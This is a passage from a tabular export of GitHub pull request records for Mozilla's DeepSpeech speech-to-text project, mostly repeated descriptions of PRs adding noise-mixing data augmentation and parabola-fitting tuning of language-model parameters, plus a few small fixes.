  --train_batch_size 1 \
  --test_batch_size 1 \
  --n_hidden 200 \
  --epochs 200 \
  --checkpoint_dir <checkpoint_dir> \
  --audio_aug_mix_noise_walk_dirs <directory1-contains-wav-files>,<directory2-contains-wav-files>
```
- Just specify the noise file directory, the process will automatically walk through the whole directory recursively, and collect .wav files (but it doesn't checkout the sample rate).
- This program assume every volume of noise audio have been maximized, to save the calculation time of each speech/noise volume balance, it just simply divide speech audio with value between `0~-10 db`, and divide noise audio with value between `-25~-50 db`
- The augment time can be as fast as freq_time_mask
- `--audio_aug_mix_noise_walk_dirs` can set multi dirs with comma separated.

To manually adjust volume loudness suppression:
```
python -u DeepSpeech.py \
...
--audio_aug_mix_noise_max_noise_db -25 \
--audio_aug_mix_noise_min_noise_db -50 \
--audio_aug_mix_noise_max_audio_db 0 \
--audio_aug_mix_noise_min_audio_db -10 \
...
```
- If your noise files are pure non-speaker noise, my experience paramters is `--audio_aug_mix_noise_max_noise_db -15`, `--audio_aug_mix_noise_min_noise_db -25`
- If your noise files are from speakers, like cocktail party, my experience paramters is `--audio_aug_mix_noise_max_noise_db -30`, `--audio_aug_mix_noise_min_noise_db -50`, otherwise, the voice can have a chance to cover the main speaker's volume.
- If you want to cache audio array into local disk, set `--audio_aug_mix_noise_cache <your cache path>`, otherwise cache in memory.",mychiux413,13641193,2019-12-31T09:57:57Z,CONTRIBUTOR,False,577,33,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c4c3ceddca33f75f43bec91d7f965e28b979a1d6,Merge #f7d1279.
1569,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2622,2622,online mix noise audio data in training step,"Mixing noisy data into training file before runtime could cause data monotonicity, but mixing noisy data in runtime could cause very bad performance, if we read each noise audio to augment each training row. (Ex: for HDD disk, the duration of mixing one audio is almost 100 times slower than freq_time_mask does).

To reduce online mixing time, I use another tf.Dataset to cache noise audio array, then mix them to training data.

usage:
```
python -u DeepSpeech.py --noshow_progressbar \
  --train_files data/ldc93s1/ldc93s1.csv \
  --test_files data/ldc93s1/ldc93s1.csv \
  --train_batch_size 1 \
  --test_batch_size 1 \
  --n_hidden 200 \
  --epochs 200 \
  --checkpoint_dir <checkpoint_dir> \
  --audio_aug_mix_noise_walk_dirs <directory1-contains-wav-files>,<directory2-contains-wav-files>
```
- Just specify the noise file directory, the process will automatically walk through the whole directory recursively, and collect .wav files (but it doesn't checkout the sample rate).
- This program assume every volume of noise audio have been maximized, to save the calculation time of each speech/noise volume balance, it just simply divide speech audio with value between `0~-10 db`, and divide noise audio with value between `-25~-50 db`
- The augment time can be as fast as freq_time_mask
- `--audio_aug_mix_noise_walk_dirs` can set multi dirs with comma separated.

To manually adjust volume loudness suppression:
```
python -u DeepSpeech.py \
...
--audio_aug_mix_noise_max_noise_db -25 \
--audio_aug_mix_noise_min_noise_db -50 \
--audio_aug_mix_noise_max_audio_db 0 \
--audio_aug_mix_noise_min_audio_db -10 \
...
```
- If your noise files are pure non-speaker noise, my experience paramters is `--audio_aug_mix_noise_max_noise_db -15`, `--audio_aug_mix_noise_min_noise_db -25`
- If your noise files are from speakers, like cocktail party, my experience paramters is `--audio_aug_mix_noise_max_noise_db -30`, `--audio_aug_mix_noise_min_noise_db -50`, otherwise, the voice can have a chance to cover the main speaker's volume.
- If you want to cache audio array into local disk, set `--audio_aug_mix_noise_cache <your cache path>`, otherwise cache in memory.",mychiux413,13641193,2019-12-31T09:57:57Z,CONTRIBUTOR,False,577,33,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c151b1d0efe9fc64a41e26f7c8777912ccc97287,"Merge branch 'master' into noisetest

# Conflicts:
#	DeepSpeech.py
#	evaluate.py
#	training/deepspeech_training/util/feeding.py"
1570,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2622,2622,online mix noise audio data in training step,"Mixing noisy data into training file before runtime could cause data monotonicity, but mixing noisy data in runtime could cause very bad performance, if we read each noise audio to augment each training row. (Ex: for HDD disk, the duration of mixing one audio is almost 100 times slower than freq_time_mask does).

To reduce online mixing time, I use another tf.Dataset to cache noise audio array, then mix them to training data.

usage:
```
python -u DeepSpeech.py --noshow_progressbar \
  --train_files data/ldc93s1/ldc93s1.csv \
  --test_files data/ldc93s1/ldc93s1.csv \
  --train_batch_size 1 \
  --test_batch_size 1 \
  --n_hidden 200 \
  --epochs 200 \
  --checkpoint_dir <checkpoint_dir> \
  --audio_aug_mix_noise_walk_dirs <directory1-contains-wav-files>,<directory2-contains-wav-files>
```
- Just specify the noise file directory, the process will automatically walk through the whole directory recursively, and collect .wav files (but it doesn't checkout the sample rate).
- This program assume every volume of noise audio have been maximized, to save the calculation time of each speech/noise volume balance, it just simply divide speech audio with value between `0~-10 db`, and divide noise audio with value between `-25~-50 db`
- The augment time can be as fast as freq_time_mask
- `--audio_aug_mix_noise_walk_dirs` can set multi dirs with comma separated.

To manually adjust volume loudness suppression:
```
python -u DeepSpeech.py \
...
--audio_aug_mix_noise_max_noise_db -25 \
--audio_aug_mix_noise_min_noise_db -50 \
--audio_aug_mix_noise_max_audio_db 0 \
--audio_aug_mix_noise_min_audio_db -10 \
...
```
- If your noise files are pure non-speaker noise, my experience paramters is `--audio_aug_mix_noise_max_noise_db -15`, `--audio_aug_mix_noise_min_noise_db -25`
- If your noise files are from speakers, like cocktail party, my experience paramters is `--audio_aug_mix_noise_max_noise_db -30`, `--audio_aug_mix_noise_min_noise_db -50`, otherwise, the voice can have a chance to cover the main speaker's volume.
- If you want to cache audio array into local disk, set `--audio_aug_mix_noise_cache <your cache path>`, otherwise cache in memory.",mychiux413,13641193,2019-12-31T09:57:57Z,CONTRIBUTOR,False,577,33,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c089b7fdf100861d6b2d12bfa4153b98a1730121,Fix merge not detecting moved scripts.
1571,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2622,2622,online mix noise audio data in training step,"Mixing noisy data into training file before runtime could cause data monotonicity, but mixing noisy data in runtime could cause very bad performance, if we read each noise audio to augment each training row. (Ex: for HDD disk, the duration of mixing one audio is almost 100 times slower than freq_time_mask does).

To reduce online mixing time, I use another tf.Dataset to cache noise audio array, then mix them to training data.

usage:
```
python -u DeepSpeech.py --noshow_progressbar \
  --train_files data/ldc93s1/ldc93s1.csv \
  --test_files data/ldc93s1/ldc93s1.csv \
  --train_batch_size 1 \
  --test_batch_size 1 \
  --n_hidden 200 \
  --epochs 200 \
  --checkpoint_dir <checkpoint_dir> \
  --audio_aug_mix_noise_walk_dirs <directory1-contains-wav-files>,<directory2-contains-wav-files>
```
- Just specify the noise file directory, the process will automatically walk through the whole directory recursively, and collect .wav files (but it doesn't checkout the sample rate).
- This program assume every volume of noise audio have been maximized, to save the calculation time of each speech/noise volume balance, it just simply divide speech audio with value between `0~-10 db`, and divide noise audio with value between `-25~-50 db`
- The augment time can be as fast as freq_time_mask
- `--audio_aug_mix_noise_walk_dirs` can set multi dirs with comma separated.

To manually adjust volume loudness suppression:
```
python -u DeepSpeech.py \
...
--audio_aug_mix_noise_max_noise_db -25 \
--audio_aug_mix_noise_min_noise_db -50 \
--audio_aug_mix_noise_max_audio_db 0 \
--audio_aug_mix_noise_min_audio_db -10 \
...
```
- If your noise files are pure non-speaker noise, my experience paramters is `--audio_aug_mix_noise_max_noise_db -15`, `--audio_aug_mix_noise_min_noise_db -25`
- If your noise files are from speakers, like cocktail party, my experience paramters is `--audio_aug_mix_noise_max_noise_db -30`, `--audio_aug_mix_noise_min_noise_db -50`, otherwise, the voice can have a chance to cover the main speaker's volume.
- If you want to cache audio array into local disk, set `--audio_aug_mix_noise_cache <your cache path>`, otherwise cache in memory.",mychiux413,13641193,2019-12-31T09:57:57Z,CONTRIBUTOR,False,577,33,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,491a4b06f9393b338346b6dd58c7dccef6cca4b2,Undo personal changes.
1572,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2622,2622,online mix noise audio data in training step,"Mixing noisy data into training file before runtime could cause data monotonicity, but mixing noisy data in runtime could cause very bad performance, if we read each noise audio to augment each training row. (Ex: for HDD disk, the duration of mixing one audio is almost 100 times slower than freq_time_mask does).

To reduce online mixing time, I use another tf.Dataset to cache noise audio array, then mix them to training data.

usage:
```
python -u DeepSpeech.py --noshow_progressbar \
  --train_files data/ldc93s1/ldc93s1.csv \
  --test_files data/ldc93s1/ldc93s1.csv \
  --train_batch_size 1 \
  --test_batch_size 1 \
  --n_hidden 200 \
  --epochs 200 \
  --checkpoint_dir <checkpoint_dir> \
  --audio_aug_mix_noise_walk_dirs <directory1-contains-wav-files>,<directory2-contains-wav-files>
```
- Just specify the noise file directory, the process will automatically walk through the whole directory recursively, and collect .wav files (but it doesn't checkout the sample rate).
- This program assume every volume of noise audio have been maximized, to save the calculation time of each speech/noise volume balance, it just simply divide speech audio with value between `0~-10 db`, and divide noise audio with value between `-25~-50 db`
- The augment time can be as fast as freq_time_mask
- `--audio_aug_mix_noise_walk_dirs` can set multi dirs with comma separated.

To manually adjust volume loudness suppression:
```
python -u DeepSpeech.py \
...
--audio_aug_mix_noise_max_noise_db -25 \
--audio_aug_mix_noise_min_noise_db -50 \
--audio_aug_mix_noise_max_audio_db 0 \
--audio_aug_mix_noise_min_audio_db -10 \
...
```
- If your noise files are pure non-speaker noise, my experience paramters is `--audio_aug_mix_noise_max_noise_db -15`, `--audio_aug_mix_noise_min_noise_db -25`
- If your noise files are from speakers, like cocktail party, my experience paramters is `--audio_aug_mix_noise_max_noise_db -30`, `--audio_aug_mix_noise_min_noise_db -50`, otherwise, the voice can have a chance to cover the main speaker's volume.
- If you want to cache audio array into local disk, set `--audio_aug_mix_noise_cache <your cache path>`, otherwise cache in memory.",mychiux413,13641193,2019-12-31T09:57:57Z,CONTRIBUTOR,False,577,33,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,735cbbb96783ee2240b40c70a6126cee14d78624,Merge branch 'master' of https://github.com/mozilla/DeepSpeech into noiseaugmaster
1573,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2620,2620,Fix JS package README,,reuben,477142,2019-12-30T09:14:26Z,MEMBER,True,2,2,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3fd25badb52af24fe97d98e2c0822e65da570962,Fix JS package README
1574,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2616,2616,Update to specify which package libpthread is in,"libpthread on Ubuntu (and presumably any other Debian or Debian derivatives) is in the libpthread-stubs0-dev package, it took me a bit of digging to find it. Best, Kathy",KathyReid,114158,2019-12-21T01:05:57Z,COLLABORATOR,True,4,4,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2a19c444d457e5b9187f43e17289ffb678b7ee15,"Update to specify which package libpthread is in

libpthread on Ubuntu (and presumably any other Debian or Debian derivatives) is in the libpthread-stubs0-dev package, it took me a bit of digging to find it. Best, Kathy"
1575,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2615,2615,Add TFLite prod tests,Fixes #2614,lissyx,1645737,2019-12-20T15:46:04Z,COLLABORATOR,True,359,0,21,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,89cd481d52d4c4fdfccfc18cf86dea1f27f5ece3,"Add TFLite prod tests

Fixes #2614"
1576,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2615,2615,Add TFLite prod tests,Fixes #2614,lissyx,1645737,2019-12-20T15:46:04Z,COLLABORATOR,True,359,0,21,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,13d05c4a6f4475b02d1a60b20696d5c09da9c389,Run with fixed release model
1577,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2613,2613,Set forget_bias=0 for static RNN implementation,Fixes #2612,lissyx,1645737,2019-12-20T12:29:49Z,COLLABORATOR,True,1,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5f003cfbd614d6cb2f576a284b68c2e8d37b7866,"Set forget_bias=0 for static RNN implementation

Fixes #2612"
1578,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2609,2609,Finetune lm parameters by fitting parabola curve,"This is an option for tuning language model parameters: `alpha`, `beta` by fitting parabola curve , then report a json file to compare the different wer between: `oringal lm params` v.s. `finetuned lm params`

Due to time-consuming issue, this tool doesn't use grid search to iterate the whole datasets, but use `parabola fitting` ([paddle-deepspeech-grid-search](https://github.com/PaddlePaddle/DeepSpeech/blob/develop/docs/images/tuning_error_surface.png)) and just iterate `sampling data` to fast get good performance.

Fitting Process Step by Step:
  * samping the specified csv file: `--finetune_lm_csv_files` with sampling size = ` --finetune_lm_sampling_size` 
  * scan `alpha` linespace from `--finetune_lm_alpha_min` to `--finetune_lm_alpha_min` with steps `--finetune_lm_alpha_steps` (set `beta` = `--lm_alpha`)
  * fitting valley parabola curve  on `wer v.s. alpha`, finding `best alpha`(the bottom of valley), if the fitting is not an idea valley parabola, just pick the lowest wer from scanning points.
  * scan `beta` linespace from `--finetune_lm_beta_min` to `--finetune_lm_beta_min` (`alpha` = `best alpha`)
  * fitting valley parabola curve  on `wer v.s. beta`, finding `best beta`, if not an idea valley parabola, just pick the lowest wer from scanning points. (in fact, most of time, beta is not valley parabola curve, and wer hardly changed)
  * ""FINE"" scan `alpha` linespace in center = `last best alpha` width = `(--finetune_lm_alpha_max - --finetune_lm_alpha_min) / 2.0` (`beta` = `best beta`)
  * fitting valley parabola curve  on `wer v.s. alpha`, finding `best alpha`, if the fitting is not an idea valley parabola, just pick the lowest wer from scanning points.
  * use `best alpha` & `best beta` to do test() again, then compare with original one
  * export a report json file to `--finetune_output_file`

This finetune option could cost 3.x consuming of test epoch (`original test` + `finetune test` + `scanning` )

usage:
```
python -u DeepSpeech.py --test_files data/test.csv \
    --finetune_lm_csv_files data/test.csv \
    --finetune_lm_sampling_size 256 \
    --finetune_output_file data/lm/finetune.json
```
output report, I use the official model to test on voxforge test data, to generate the report, you must specify the `--test_files` and `--finetune_output_file`:
```
{
    ""origin_test_result"": {
        ""alpha"": 0.75,
        ""beta"": 1.85,
        ""samples_wer"": 0.19957946381636588,
        ""samples_cer"": 0.1047226538747382
    },
    ""finetune_test_result"": {
        ""alpha"": 0.9464133991551923,
        ""beta"": 2.0,
        ""samples_wer"": 0.19852812335728054,
        ""samples_cer"": 0.10810080399972975
    },
    ""finetune_parameters"": {
        ""sample_size"": 256,
        ""alpha_min"": 0.5,
        ""alpha_max"": 1.5,
        ""alpha_steps"": 7,
        ""beta_min"": 1.0,
        ""beta_max"": 2.0,
        ""beta_steps"": 5,
        ""csv_files"": ""data/test.csv""
    }
}
```

### Other modification
----
* fix evaluate.py missing `import sys`
* return samples from test() for comparing results
* remove `test_csvs = FLAGS.test_files.split(',')` in `evaluate(test_csvs, create_model, try_loading)` function, this line overwrite the input argument `test_csvs`
",mychiux413,13641193,2019-12-18T04:34:35Z,CONTRIBUTOR,False,437,13,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,16b7831a1bee52ad4bdabb3136a637b721ada5a2,"[ADD] finetune alpha with parabola fitting, beta with best pick up"
1579,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2609,2609,Finetune lm parameters by fitting parabola curve,"This is an option for tuning language model parameters: `alpha`, `beta` by fitting parabola curve , then report a json file to compare the different wer between: `oringal lm params` v.s. `finetuned lm params`

Due to time-consuming issue, this tool doesn't use grid search to iterate the whole datasets, but use `parabola fitting` ([paddle-deepspeech-grid-search](https://github.com/PaddlePaddle/DeepSpeech/blob/develop/docs/images/tuning_error_surface.png)) and just iterate `sampling data` to fast get good performance.

Fitting Process Step by Step:
  * samping the specified csv file: `--finetune_lm_csv_files` with sampling size = ` --finetune_lm_sampling_size` 
  * scan `alpha` linespace from `--finetune_lm_alpha_min` to `--finetune_lm_alpha_min` with steps `--finetune_lm_alpha_steps` (set `beta` = `--lm_alpha`)
  * fitting valley parabola curve  on `wer v.s. alpha`, finding `best alpha`(the bottom of valley), if the fitting is not an idea valley parabola, just pick the lowest wer from scanning points.
  * scan `beta` linespace from `--finetune_lm_beta_min` to `--finetune_lm_beta_min` (`alpha` = `best alpha`)
  * fitting valley parabola curve  on `wer v.s. beta`, finding `best beta`, if not an idea valley parabola, just pick the lowest wer from scanning points. (in fact, most of time, beta is not valley parabola curve, and wer hardly changed)
  * ""FINE"" scan `alpha` linespace in center = `last best alpha` width = `(--finetune_lm_alpha_max - --finetune_lm_alpha_min) / 2.0` (`beta` = `best beta`)
  * fitting valley parabola curve  on `wer v.s. alpha`, finding `best alpha`, if the fitting is not an idea valley parabola, just pick the lowest wer from scanning points.
  * use `best alpha` & `best beta` to do test() again, then compare with original one
  * export a report json file to `--finetune_output_file`

This finetune option could cost 3.x consuming of test epoch (`original test` + `finetune test` + `scanning` )

usage:
```
python -u DeepSpeech.py --test_files data/test.csv \
    --finetune_lm_csv_files data/test.csv \
    --finetune_lm_sampling_size 256 \
    --finetune_output_file data/lm/finetune.json
```
output report, I use the official model to test on voxforge test data, to generate the report, you must specify the `--test_files` and `--finetune_output_file`:
```
{
    ""origin_test_result"": {
        ""alpha"": 0.75,
        ""beta"": 1.85,
        ""samples_wer"": 0.19957946381636588,
        ""samples_cer"": 0.1047226538747382
    },
    ""finetune_test_result"": {
        ""alpha"": 0.9464133991551923,
        ""beta"": 2.0,
        ""samples_wer"": 0.19852812335728054,
        ""samples_cer"": 0.10810080399972975
    },
    ""finetune_parameters"": {
        ""sample_size"": 256,
        ""alpha_min"": 0.5,
        ""alpha_max"": 1.5,
        ""alpha_steps"": 7,
        ""beta_min"": 1.0,
        ""beta_max"": 2.0,
        ""beta_steps"": 5,
        ""csv_files"": ""data/test.csv""
    }
}
```

### Other modification
----
* fix evaluate.py missing `import sys`
* return samples from test() for comparing results
* remove `test_csvs = FLAGS.test_files.split(',')` in `evaluate(test_csvs, create_model, try_loading)` function, this line overwrite the input argument `test_csvs`
",mychiux413,13641193,2019-12-18T04:34:35Z,CONTRIBUTOR,False,437,13,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9858e6d34bee8cd738d5bb5ce81cf2bf6ae0ff3a,[ADD] export finetune info
1580,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2609,2609,Finetune lm parameters by fitting parabola curve,"This is an option for tuning language model parameters: `alpha`, `beta` by fitting parabola curve , then report a json file to compare the different wer between: `oringal lm params` v.s. `finetuned lm params`

Due to time-consuming issue, this tool doesn't use grid search to iterate the whole datasets, but use `parabola fitting` ([paddle-deepspeech-grid-search](https://github.com/PaddlePaddle/DeepSpeech/blob/develop/docs/images/tuning_error_surface.png)) and just iterate `sampling data` to fast get good performance.

Fitting Process Step by Step:
  * samping the specified csv file: `--finetune_lm_csv_files` with sampling size = ` --finetune_lm_sampling_size` 
  * scan `alpha` linespace from `--finetune_lm_alpha_min` to `--finetune_lm_alpha_min` with steps `--finetune_lm_alpha_steps` (set `beta` = `--lm_alpha`)
  * fitting valley parabola curve  on `wer v.s. alpha`, finding `best alpha`(the bottom of valley), if the fitting is not an idea valley parabola, just pick the lowest wer from scanning points.
  * scan `beta` linespace from `--finetune_lm_beta_min` to `--finetune_lm_beta_min` (`alpha` = `best alpha`)
  * fitting valley parabola curve  on `wer v.s. beta`, finding `best beta`, if not an idea valley parabola, just pick the lowest wer from scanning points. (in fact, most of time, beta is not valley parabola curve, and wer hardly changed)
  * ""FINE"" scan `alpha` linespace in center = `last best alpha` width = `(--finetune_lm_alpha_max - --finetune_lm_alpha_min) / 2.0` (`beta` = `best beta`)
  * fitting valley parabola curve  on `wer v.s. alpha`, finding `best alpha`, if the fitting is not an idea valley parabola, just pick the lowest wer from scanning points.
  * use `best alpha` & `best beta` to do test() again, then compare with original one
  * export a report json file to `--finetune_output_file`

This finetune option could cost 3.x consuming of test epoch (`original test` + `finetune test` + `scanning` )

usage:
```
python -u DeepSpeech.py --test_files data/test.csv \
    --finetune_lm_csv_files data/test.csv \
    --finetune_lm_sampling_size 256 \
    --finetune_output_file data/lm/finetune.json
```
output report, I use the official model to test on voxforge test data, to generate the report, you must specify the `--test_files` and `--finetune_output_file`:
```
{
    ""origin_test_result"": {
        ""alpha"": 0.75,
        ""beta"": 1.85,
        ""samples_wer"": 0.19957946381636588,
        ""samples_cer"": 0.1047226538747382
    },
    ""finetune_test_result"": {
        ""alpha"": 0.9464133991551923,
        ""beta"": 2.0,
        ""samples_wer"": 0.19852812335728054,
        ""samples_cer"": 0.10810080399972975
    },
    ""finetune_parameters"": {
        ""sample_size"": 256,
        ""alpha_min"": 0.5,
        ""alpha_max"": 1.5,
        ""alpha_steps"": 7,
        ""beta_min"": 1.0,
        ""beta_max"": 2.0,
        ""beta_steps"": 5,
        ""csv_files"": ""data/test.csv""
    }
}
```

### Other modification
----
* fix evaluate.py missing `import sys`
* return samples from test() for comparing results
* remove `test_csvs = FLAGS.test_files.split(',')` in `evaluate(test_csvs, create_model, try_loading)` function, this line overwrite the input argument `test_csvs`
",mychiux413,13641193,2019-12-18T04:34:35Z,CONTRIBUTOR,False,437,13,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0b5e3523467658e788f9b1e3a4ea570b2d9b9b41,[FIX] scan half width for fine scanning
1581,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2609,2609,Finetune lm parameters by fitting parabola curve,"This is an option for tuning language model parameters: `alpha`, `beta` by fitting parabola curve , then report a json file to compare the different wer between: `oringal lm params` v.s. `finetuned lm params`

Due to time-consuming issue, this tool doesn't use grid search to iterate the whole datasets, but use `parabola fitting` ([paddle-deepspeech-grid-search](https://github.com/PaddlePaddle/DeepSpeech/blob/develop/docs/images/tuning_error_surface.png)) and just iterate `sampling data` to fast get good performance.

Fitting Process Step by Step:
  * samping the specified csv file: `--finetune_lm_csv_files` with sampling size = ` --finetune_lm_sampling_size` 
  * scan `alpha` linespace from `--finetune_lm_alpha_min` to `--finetune_lm_alpha_min` with steps `--finetune_lm_alpha_steps` (set `beta` = `--lm_alpha`)
  * fitting valley parabola curve  on `wer v.s. alpha`, finding `best alpha`(the bottom of valley), if the fitting is not an idea valley parabola, just pick the lowest wer from scanning points.
  * scan `beta` linespace from `--finetune_lm_beta_min` to `--finetune_lm_beta_min` (`alpha` = `best alpha`)
  * fitting valley parabola curve  on `wer v.s. beta`, finding `best beta`, if not an idea valley parabola, just pick the lowest wer from scanning points. (in fact, most of time, beta is not valley parabola curve, and wer hardly changed)
  * ""FINE"" scan `alpha` linespace in center = `last best alpha` width = `(--finetune_lm_alpha_max - --finetune_lm_alpha_min) / 2.0` (`beta` = `best beta`)
  * fitting valley parabola curve  on `wer v.s. alpha`, finding `best alpha`, if the fitting is not an idea valley parabola, just pick the lowest wer from scanning points.
  * use `best alpha` & `best beta` to do test() again, then compare with original one
  * export a report json file to `--finetune_output_file`

This finetune option could cost 3.x consuming of test epoch (`original test` + `finetune test` + `scanning` )

usage:
```
python -u DeepSpeech.py --test_files data/test.csv \
    --finetune_lm_csv_files data/test.csv \
    --finetune_lm_sampling_size 256 \
    --finetune_output_file data/lm/finetune.json
```
output report, I use the official model to test on voxforge test data, to generate the report, you must specify the `--test_files` and `--finetune_output_file`:
```
{
    ""origin_test_result"": {
        ""alpha"": 0.75,
        ""beta"": 1.85,
        ""samples_wer"": 0.19957946381636588,
        ""samples_cer"": 0.1047226538747382
    },
    ""finetune_test_result"": {
        ""alpha"": 0.9464133991551923,
        ""beta"": 2.0,
        ""samples_wer"": 0.19852812335728054,
        ""samples_cer"": 0.10810080399972975
    },
    ""finetune_parameters"": {
        ""sample_size"": 256,
        ""alpha_min"": 0.5,
        ""alpha_max"": 1.5,
        ""alpha_steps"": 7,
        ""beta_min"": 1.0,
        ""beta_max"": 2.0,
        ""beta_steps"": 5,
        ""csv_files"": ""data/test.csv""
    }
}
```

### Other modification
----
* fix evaluate.py missing `import sys`
* return samples from test() for comparing results
* remove `test_csvs = FLAGS.test_files.split(',')` in `evaluate(test_csvs, create_model, try_loading)` function, this line overwrite the input argument `test_csvs`
",mychiux413,13641193,2019-12-18T04:34:35Z,CONTRIBUTOR,False,437,13,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,66ffe5e9ccd49111c3359124b0a4de17de82c77e,[MODIFY] can manually choose where the temp sampling csv file to put
1582,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2609,2609,Finetune lm parameters by fitting parabola curve,"This is an option for tuning language model parameters: `alpha`, `beta` by fitting parabola curve , then report a json file to compare the different wer between: `oringal lm params` v.s. `finetuned lm params`

Due to time-consuming issue, this tool doesn't use grid search to iterate the whole datasets, but use `parabola fitting` ([paddle-deepspeech-grid-search](https://github.com/PaddlePaddle/DeepSpeech/blob/develop/docs/images/tuning_error_surface.png)) and just iterate `sampling data` to fast get good performance.

Fitting Process Step by Step:
  * samping the specified csv file: `--finetune_lm_csv_files` with sampling size = ` --finetune_lm_sampling_size` 
  * scan `alpha` linespace from `--finetune_lm_alpha_min` to `--finetune_lm_alpha_min` with steps `--finetune_lm_alpha_steps` (set `beta` = `--lm_alpha`)
  * fitting valley parabola curve  on `wer v.s. alpha`, finding `best alpha`(the bottom of valley), if the fitting is not an idea valley parabola, just pick the lowest wer from scanning points.
  * scan `beta` linespace from `--finetune_lm_beta_min` to `--finetune_lm_beta_min` (`alpha` = `best alpha`)
  * fitting valley parabola curve  on `wer v.s. beta`, finding `best beta`, if not an idea valley parabola, just pick the lowest wer from scanning points. (in fact, most of time, beta is not valley parabola curve, and wer hardly changed)
  * ""FINE"" scan `alpha` linespace in center = `last best alpha` width = `(--finetune_lm_alpha_max - --finetune_lm_alpha_min) / 2.0` (`beta` = `best beta`)
  * fitting valley parabola curve  on `wer v.s. alpha`, finding `best alpha`, if the fitting is not an idea valley parabola, just pick the lowest wer from scanning points.
  * use `best alpha` & `best beta` to do test() again, then compare with original one
  * export a report json file to `--finetune_output_file`

This finetune option could cost 3.x consuming of test epoch (`original test` + `finetune test` + `scanning` )

usage:
```
python -u DeepSpeech.py --test_files data/test.csv \
    --finetune_lm_csv_files data/test.csv \
    --finetune_lm_sampling_size 256 \
    --finetune_output_file data/lm/finetune.json
```
output report, I use the official model to test on voxforge test data, to generate the report, you must specify the `--test_files` and `--finetune_output_file`:
```
{
    ""origin_test_result"": {
        ""alpha"": 0.75,
        ""beta"": 1.85,
        ""samples_wer"": 0.19957946381636588,
        ""samples_cer"": 0.1047226538747382
    },
    ""finetune_test_result"": {
        ""alpha"": 0.9464133991551923,
        ""beta"": 2.0,
        ""samples_wer"": 0.19852812335728054,
        ""samples_cer"": 0.10810080399972975
    },
    ""finetune_parameters"": {
        ""sample_size"": 256,
        ""alpha_min"": 0.5,
        ""alpha_max"": 1.5,
        ""alpha_steps"": 7,
        ""beta_min"": 1.0,
        ""beta_max"": 2.0,
        ""beta_steps"": 5,
        ""csv_files"": ""data/test.csv""
    }
}
```

### Other modification
----
* fix evaluate.py missing `import sys`
* return samples from test() for comparing results
* remove `test_csvs = FLAGS.test_files.split(',')` in `evaluate(test_csvs, create_model, try_loading)` function, this line overwrite the input argument `test_csvs`
",mychiux413,13641193,2019-12-18T04:34:35Z,CONTRIBUTOR,False,437,13,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c0f22b33456573c83a31d4ffb44dfccee3eef057,"[ADD] markdown to explain algorithm, [FIX] take sample['word_distance'] as result is more resonable"
1583,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2609,2609,Finetune lm parameters by fitting parabola curve,"This is an option for tuning language model parameters: `alpha`, `beta` by fitting parabola curve , then report a json file to compare the different wer between: `oringal lm params` v.s. `finetuned lm params`

Due to time-consuming issue, this tool doesn't use grid search to iterate the whole datasets, but use `parabola fitting` ([paddle-deepspeech-grid-search](https://github.com/PaddlePaddle/DeepSpeech/blob/develop/docs/images/tuning_error_surface.png)) and just iterate `sampling data` to fast get good performance.

Fitting Process Step by Step:
  * samping the specified csv file: `--finetune_lm_csv_files` with sampling size = ` --finetune_lm_sampling_size` 
  * scan `alpha` linespace from `--finetune_lm_alpha_min` to `--finetune_lm_alpha_min` with steps `--finetune_lm_alpha_steps` (set `beta` = `--lm_alpha`)
  * fitting valley parabola curve  on `wer v.s. alpha`, finding `best alpha`(the bottom of valley), if the fitting is not an idea valley parabola, just pick the lowest wer from scanning points.
  * scan `beta` linespace from `--finetune_lm_beta_min` to `--finetune_lm_beta_min` (`alpha` = `best alpha`)
  * fitting valley parabola curve  on `wer v.s. beta`, finding `best beta`, if not an idea valley parabola, just pick the lowest wer from scanning points. (in fact, most of time, beta is not valley parabola curve, and wer hardly changed)
